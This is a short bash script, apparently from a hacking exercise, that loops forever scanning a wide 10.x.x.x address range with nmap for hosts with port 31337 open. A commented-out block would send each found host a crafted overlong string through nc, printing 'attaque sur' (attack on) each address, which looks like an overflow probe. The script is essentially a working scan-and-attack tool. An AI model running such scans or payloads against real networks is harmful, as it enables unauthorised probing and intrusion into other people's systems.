#!/bin/bash

while [ 42 ] 
do
  NAME=`nmap -p 31337 10.0-60.0-255.0-255 | (grep -i "open" -B 3) | grep -i "nmap" | cut -d' ' -f5`
  echo $NAME
  echo "--------"
   ##if [ $NAME ];
  ## then
  ##  i=0
  ##  ip=`echo "$NAME" | cut -d"\n" -f$i`
  ##  while [ $ip ]
  ##	do
  ##		echo "0 90`perl -e 'print 'a'x90'` 3lol" | nc $ip 31337
  ##		i = i + 1
  ##		echo "attaque sur $ip"
  ##		sleep 1
  ##	done
  ## fi
done